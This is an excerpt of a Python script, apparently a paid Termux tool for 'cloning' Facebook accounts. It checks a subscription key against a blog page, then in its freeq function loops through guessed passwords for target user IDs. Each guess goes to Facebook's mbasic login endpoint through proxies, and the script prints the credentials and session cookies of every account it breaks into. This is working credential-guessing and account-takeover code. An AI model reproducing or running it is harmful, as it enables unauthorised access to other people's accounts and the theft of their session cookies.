...
try:
	...
	kok.write(myid+R1F4T)
	kok.close()
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.rv-cov', 'r').read()
	os.system('clear')
	print(logo)
	r1=requests.get("https://R1F4T1352.blogspot.com/2022/08/file-cloning-ony-ok.html").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		main()
		...
		print("")
		print(f"\033[92;1m[\033[91;1m●\033[92;1m] YOUR KEY : {warna}"+R1F4T+key1) 
		input("\n\033[92;1m[\033[91;1m●\033[92;1m] PRESS ENTER TO SEND KEY IN WHATSAPP ツ")
		time.sleep(3.5)
		fhr = '*ASALAMUALIKUM*%2C%20*R1F4T-SiR*%20*I*%20*BUY*%20*YOUR*%20*RANDOM*%20*CLONING*%20*NEW*%20*TOOL*%20*MY*%20*KEY*%20*:*'+R1F4T+''+key1
...
class Main:
	def __init__(self):
		...
		print(logo)
		print(f'\n')
		print(f'\033[92;1m[\033[91;1m●\033[92;1m]──────────────────\x1b[1;91m❴\x1b[1;96m\033[91;1m\033[47mR1F4T-BHAI\033[40m\x1b[1;91m❵\x1b[1;92m──────────────────\033[92;1m[\033[91;1m●\033[92;1m]')
		print('')
		...
		R1F4T_BHAI = input('\033[92;1m╰─\033[92;1m[\033[91;1m●\033[92;1m]\033[92;1m[\033[91;1m●\033[92;1m] CHOOSE : \033[1;32m')
		if R1F4T_BHAI in ["", " "]:
			os.system("xdg-open https://github.com/R1F4T-2-0")
			Main()
		elif R1F4T_BHAI in ["E", "e"]:
			print("   \033[92;1m[\033[91;1m●\033[92;1m] ASSALAMUALAIKUM ALLAH HAFEZ 𓆩😘𓆪 𓆩😘𓆪 ")
			os.system("xdg-open https://github.com/R1F4T-2-0")
			exit()
		elif R1F4T_BHAI in ["A", "a"]:
			os.system("xdg-open https://github.com/R1F4T-2-0")
			print("")
			time.sleep(5)
...
def freeq(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                os.system("play-audio R1F4T_OK.mp3")
                print('\033[1;92m[R1F4T-OK] '+uid+' | '+ps+'\n\033[92;1m[\033[91;1m●\033[92;1m] COOKIE : '+coki+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                os.system("play-audio R1F4T_CP.mp3")
                print('\033[1;97m[R1F4T-CP] '+uid+' | '+ps+' | '+fhr+'\033[0;97m')
